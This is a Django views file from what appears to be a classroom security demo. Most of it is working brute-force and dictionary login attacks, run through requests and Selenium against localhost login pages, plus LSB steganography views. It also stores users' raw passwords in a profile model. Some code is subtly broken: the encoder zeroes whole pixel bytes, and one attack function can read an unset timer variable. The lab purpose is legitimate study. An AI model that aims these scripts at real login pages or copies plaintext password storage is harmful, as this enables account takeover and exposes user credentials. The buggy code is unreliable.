from django.shortcuts import render, redirect
from django.http import HttpResponse,  FileResponse
from django.contrib.auth import login,authenticate, logout
from django.contrib.auth.models import User
from .forms import CustomLoginForm
from .models import TodoUserProfile
from selenium import webdriver
from selenium.webdriver.common.by import By
import time, itertools, mimetypes, string, cv2, tempfile
import numpy as np
import os
from django.core.files.base import ContentFile
from io import BytesIO
from django.core.files.storage import default_storage
from django.utils.text import slugify
import requests




chemin_driver_chrome = ''
chemin_dictionnaire = "C:\password_3char_01.txt"
chemin_dictionnaire1 = "C:\password_5char_number.txt"

caracteres_all = string.ascii_letters + string.digits + string.punctuation
caracteres_number = string.digits
caracteres_un_zero = '01'
password_length1= 3
password_length = 5

"""def signup(request):
    if request.method == 'POST':
        form = CustomUserCreationForm(request.POST)
        if form.is_valid():
            form.save()
            username = form.cleaned_data.get('username')
            raw_password = form.cleaned_data.get('password1')
            user = authenticate(username=username, password=raw_password)
            return redirect('login')  # Replace 'home' with your desired URL name.
    else:
        form = CustomUserCreationForm()
    return render(request, 'registration/signup.html', {'form': form})


def signup(request):
    if request.method=='POST':
        uname=request.POST.get('username')
        email=request.POST.get('email')
        pass1=request.POST.get('password1')
        pass2=request.POST.get('password2')

        if pass1!=pass2:
            return HttpResponse("Your password and confrom password are not Same!!")
        else:

            my_user=User.objects.create_user(uname,email,pass1)
            my_user.save()
            return redirect('login')

    return render (request,'registration/signup.html')
"""


def signup(request):
  if request.method=='POST':
    uname = request.POST.get('username')
    email = request.POST.get('email')
    pass1 = request.POST.get('password1')
    pass2 = request.POST.get('password2')
    first_name = request.POST.get('first_name')
    last_name = request.POST.get('last_name')

    if pass1!=pass2:
      return HttpResponse("Your passwords do not match.")

    else:
      user = User.objects.create_user(uname, email, pass1)
      user.first_name = first_name
      user.last_name = last_name
      user.save()
      user_profile = TodoUserProfile(user=user, password1=pass1)
      user_profile.save()

            # Connectez l'utilisateur après l'inscription
      login(request, user)
      
      return redirect('login')

  return render(request, 'registration/signup.html')

def Login_nocaptha(request):
    if request.method=='POST':
        username=request.POST.get('username')
        pass1=request.POST.get('password')
        user=authenticate(request,username=username,password=pass1)
        if user is not None:
            login(request,user)
            return redirect('home')
        else:
            return HttpResponse ("Username or Password is incorrect!!!")

    return render (request,'registration/login_nocaptcha.html')

def login_view(request):
    if request.method == 'POST':
        form = CustomLoginForm(data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)
            return redirect('home')  # Replace 'home' with your desired URL name.
    else:
        form = CustomLoginForm()
    return render(request, 'registration/login.html', {'form': form})

def Index(request):
    return render (request,'index.html')

def index(request):
    username = request.user.first_name
    return render(request,'home.html',{'username': username})



def HomePage(request):
    return render (request,'home.html')


def logout_view(request):
    logout(request)
    return redirect('login_nocaptha')



#########################################################################
#ataque de dictionnaire de 0 et 1 


def attaque_dictionnaire_un_zero_3char_requests(request):
    if request.method == 'GET':
        return render(request, 'attaque_dictionnaire_zero_un.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquedictionnaireun_zero_3char_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'attaque_dictionnaire_zero_un.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'attaque_dictionnaire_zero_un.html', context)    




def attaquedictionnaireun_zero_3char_requests(username):
    with open(chemin_dictionnaire, "r") as f:
        mots_de_passe = f.read().splitlines()

    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    #login_page = session.get(login_url)
    debut_time = time.time()


    for mot in mots_de_passe:
        login_data = {
            "username": username,
            "password": mot
        }

        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(mot)
            fin_time = time.time()
            success = True
            break
        
    fin_time = time.time()
    temp_execution = fin_time - debut_time   # Utilisation de fin_time en toute sécurité
    if success:
        return True, mot, temp_execution
    else:
        return False, None, temp_execution




# attaque par dictionnaire de 0 a 9 
def attaque_dictionnaire_requests(request):
    if request.method == 'GET':
        return render(request, 'attaque_dictionnaire.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquedictionnaire_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'attaque_dictionnaire.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'attaque_dictionnaire.html', context)    




def attaquedictionnaire_requests(username):
    with open(chemin_dictionnaire1, "r") as f:
        mots_de_passe = f.read().splitlines()

    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    #login_page = session.get(login_url)
    debut_time = time.time()


    for mot in mots_de_passe:
        login_data = {
            "username": username,
            "password": mot
        }

        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(mot)
            fin_time = time.time()
            success = True
            break

    fin_time = time.time()
    temp_execution = fin_time - debut_time   # Utilisation de fin_time en toute sécurité
    if success:
        return True, mot, temp_execution
    else:
        return False, None, temp_execution









###### views
#attaque par selenium
def attaque_dictionnaire(request):
    if request.method == 'GET':
        return render(request, 'attaque_dictionnaire.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquedictionnaire(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'attaque_dictionnaire.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'attaque_dictionnaire.html', context)    


       
            
#### fonction #########
def attaquedictionnaire(username):
    driver = webdriver.Chrome(chemin_driver_chrome)
    debut_time = time.time()

    with open(chemin_dictionnaire1, "r") as f:
        mots_de_passe = f.read().splitlines()

    success = False

    for mot in mots_de_passe:
        driver.get("http://127.0.0.1:8000/login_nocaptha/")
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")
        username_field.send_keys(username)
        password_field.send_keys(mot)
        connexion_button = driver.find_element(By.NAME, "button_login")
        connexion_button.click()

        if driver.current_url == "http://127.0.0.1:8000/home/":
            fin_time = time.time()
            success = True
            break

    #driver.quit()
    temp_execution = fin_time - debut_time
    if success:
        return True, mot, temp_execution
    else:
        fin_time = time.time()
        temp_execution = fin_time - debut_time
        return False, None, temp_execution


##########################################################################
## attaque brut force 3 char de 0 et 1

def attaque_brute_force_un_zero_3char_requests(request):
    if request.method == 'GET':
        return render(request, 'brute_force_un_zero_3char.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquebruteforce__un_zero_3char_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'brute_force_un_zero_3char.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            print('envouer')
            return render(request, 'brute_force_un_zero_3char.html', context) 
        

        
def attaquebruteforce__un_zero_3char_requests(username):
    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    #login_page = session.get(login_url)
    debut_time = time.time()

   
    for password_generer in itertools.product(caracteres_un_zero, repeat=password_length1):
        password1 = ''.join(password_generer)

        login_data = {
            "username": username,
            "password": password1
        }
        print(password1)

        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(password1)
            fin_time = time.time()
            success = True
            break

    fin_time = time.time()
    temp_execution = fin_time - debut_time
    if success:
        return True, password1, temp_execution
    else:
        return False, None, temp_execution





# attaque brut force  number 0 1 2 .. 8 9 
#requests


def attaque_brute_force_number_requests(request):
    if request.method == 'GET':
        return render(request, 'brute_force_number.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquebruteforce_number_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'brute_force_number.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'brute_force_number.html', context) 
        

        
def attaquebruteforce_number_requests(username):
    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    #login_page = session.get(login_url)
    debut_time = time.time()

   
    for password_generer in itertools.product(caracteres_number, repeat=password_length):
        password1 = ''.join(password_generer)

        login_data = {
            "username": username,
            "password": password1
        }

        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(password1)
            fin_time = time.time()
            success = True
            break

    fin_time = time.time()
    temp_execution = fin_time - debut_time
    if success:
        return True, password1, temp_execution
    else:
        return False, None, temp_execution




#fonction 

#########################################################
# attaque brut force  all char 
#requests
def attaque_brute_force_all_char_requests(request):
    if request.method == 'GET':
        return render(request, 'brute_force_all_char.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquebruteforce_all_char_requests(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'brute_force_all_char.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'brute_force_all_char.html', context) 

#fonction 

def attaquebruteforce_all_char_requests(username):
    success = False
    login_url = "http://localhost/cryptobox/login.php"
    session = requests.Session()
    #login_page = session.get(login_url)
    debut_time = time.time()

   
    for password_generer in itertools.product(caracteres_all, repeat=password_length):
        password1 = ''.join(password_generer)

        login_data = {
            "username": username,
            "password": password1
        }

        response = session.post(login_url, data=login_data)
        if response.url == "http://localhost/cryptobox/home.html":
            print(password1)
            fin_time = time.time()
            success = True
            break

    fin_time = time.time()
    temp_execution = fin_time - debut_time
    if success:
        return True, password1, temp_execution
    else:
        return False, None, temp_execution



# view
# selenium  
def attaque_brute_force(request):
    if request.method == 'GET':
        return render(request, 'brute_force.html')

    if request.method == 'POST':
        username = request.POST.get('username')
        success, password, temp_execution = attaquebruteforce(username)

        if success:
            context = {
                'success' : success,
                'password': password,
                'temp_execution': temp_execution
            }
            return render(request, 'brute_force.html', context)
        else:
            context = {
                'nosuccess': True,
                'temp_execution': temp_execution,
            }
            return render(request, 'brute_force.html', context) 



 # fonction           
def attaquebruteforce(username):
    driver = webdriver.Chrome(chemin_driver_chrome) 
    success = False
    debut_time = time.time()
   
    for password_generer in itertools.product(caracteres_all, repeat=password_length):
        password1 = ''.join(password_generer)
        driver.get("http://127.0.0.1:8000/login_nocaptha/")
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")
        username_field.send_keys(username)
        password_field.send_keys(password1)
        connexion_button = driver.find_element(By.NAME, "button_login")
        connexion_button.click()

        if driver.current_url == "http://127.0.0.1:8000/home/":
            fin_time = time.time()
            success = True
            break


    temp_execution = fin_time - debut_time
    if success:
        return True, password1, temp_execution
    else:
        return False, None, temp_execution



###################################################################################
# steganographie  encode 


def Steganography_encode(request):
    if request.method == 'POST':
        image = request.FILES['image']
        secret_data = request.POST['secret_data']
        image_name = image.name
        #enregistrer l'image téléchargée sur le disque temporaire de manière temporaire afin de pouvoir 
        # la traiter (dans ce cas, l'encodage) avant de la renvoyer en tant que téléchargement.
        with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmpfile:
            #delete=False garantit que le fichier temporaire ne sera pas automatiquement supprimé lorsque 
            # vous le fermerez. Cela signifie que vous pouvez y accéder et le traiter comme un fichier ordinaire.

            for chunk in image.chunks():#Cela parcourt les morceaux (chunks) de données de l'image téléchargée (image). Les fichiers téléchargés via un formulaire web peuvent être divisés en petits morceaux pour économiser de la mémoire, donc cette boucle lit ces morceaux un par un
                tmpfile.write(chunk)# À chaque itération de la boucle, le contenu du morceau (chunk) est écrit dans le fichier temporaire (tmpfile). Ainsi, l'image téléchargée est progressivement enregistrée dans le fichier temporaire.

        encoded_image, error_message = encode(tmpfile.name, secret_data)
        if error_message:
            return render(request, 'Steganographyencode.html', {'error_message': error_message})

        output_image = os.path.join(tempfile.gettempdir(), 'image_encode.png')# prépare le chemin complet pour le fichier de sortie,
        #en utilisant le répertoire temporaire par défaut obtenu à partir , tempfile.gettempdir(): Cela renvoie le répertoire temporaire 
        # par défaut du système d'exploitation. 

        # Enregistrez l'image encodée dans un fichier temporaire
        cv2.imwrite(output_image, encoded_image)
        
        #En résumé, ce code configure l'en-tête de la réponse HTTP pour permettre le téléchargement 
        # d'un fichier image encodée par l'utilisateur, avec un nom de fichier personnalisé.

        # Créez un nom de fichier unique pour l'image téléchargeable avec l'extension .png
        # Utilisez le nom de fichier d'entrée pour générer le nom du fichier de sortie encodé

        base_filename, ext = os.path.splitext(image_name)#utilisé pour séparer le nom de fichier en deux parties :
        #le nom de base du fichier (sans extension) et ext (png, jpg,....) 
        filename = slugify(base_filename) + '_encoded'+ext
        response = FileResponse(open(output_image, 'rb'))#crée une réponse HTTP de type FileResponse en ouvrant 
        #le fichier image encodée (output_image) en mode lecture binaire ('rb'). 
        # Cela permet de lire le contenu du fichier pour qu'il puisse être inclus dans la réponse HTTP.
        response['Content-Disposition'] = f'attachment; filename="{filename}"'# configurer l'en-tête Content-Disposition 
        #de la réponse HTTP. L'en-tête Content-Disposition indique au navigateur comment traiter la réponse. 
        # Dans ce cas, le paramètre 'attachment' indique que le contenu doit être téléchargé en tant que fichier 
        # attaché au lieu d'être affiché directement dans le navigateur. Le paramètre filename spécifie le nom de fichier 
        # sous lequel le fichier sera enregistré sur l'ordinateur de l'utilisateur. Le nom de fichier est extrait de la 
        # variable filename créée précédemment.

        return response

    return render(request, 'Steganographyencode.html')


def encode(image_name, secret_data):
    image = cv2.imread(image_name) 
    n_bytes = image.shape[0] * image.shape[1] * 3 // 8
    if len(secret_data) > n_bytes:
        return None, "[!] Insufficient bytes, need a bigger image or less data."

    secret_data += "#+--+#"
    binary_secret_data = to_bin(secret_data)
    data_len = len(binary_secret_data) 
    flat_image = image.reshape(-1, 1) 
    for i in range(data_len):
        flat_image[i, :1] = (flat_image[i, :1] & 0) | int(binary_secret_data[i])
    
    image = flat_image.reshape(image.shape)

    return image, None


def to_bin(data):
    conversion_functions = {
        str: lambda x: ''.join(format(ord(i), "08b") for i in x), 
        bytes: lambda x: ''.join(format(i, "08b") for i in x),  # hexadécimal) 
        np.ndarray: lambda x: [format(i, "08b") for i in x], # tableau ex np.array([1, 2])
        int: lambda x: format(x, "08b"), 
        np.uint8: lambda x: format(x, "08b") # est utilisé pour stocker des valeurs de 
    }

    data_type = type(data)
    if data_type in conversion_functions:
        return conversion_functions[data_type](data)
    else:
        raise TypeError("Type not supported.")



#######################################################
#stegano decode 

def Steganography_decode(request):
    if request.method == 'POST':
        image = request.FILES['image']

        # Enregistrez le fichier sur le disque temporaire
        with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmpfile:
            for chunk in image.chunks():
                tmpfile.write(chunk)

        # Maintenant, utilisez le chemin du fichier enregistré
        decoded_data = decode(tmpfile.name)

        # Retourne les données décodées
        return render(request, 'Steganographydecode.html',  {'decoded_data': decoded_data })

    return render(request, 'Steganographydecode.html')

def decode(image_name):
    image = cv2.imread(image_name) 
    decoded_data = ""
    binary_data = ""
    flat_image = image.reshape(-1, 1)
    for valeur_cellule in flat_image: 
        binary_data += str(valeur_cellule[-1] & 1)

    all_bytes = [ binary_data[i: i+8] for i in range(0, len(binary_data), 8) ]
    
    for byte in all_bytes:
        decoded_data += chr(int(byte, 2))
        if decoded_data[-6:] == "#+--+#":
            break 
    return decoded_data[:-6]    
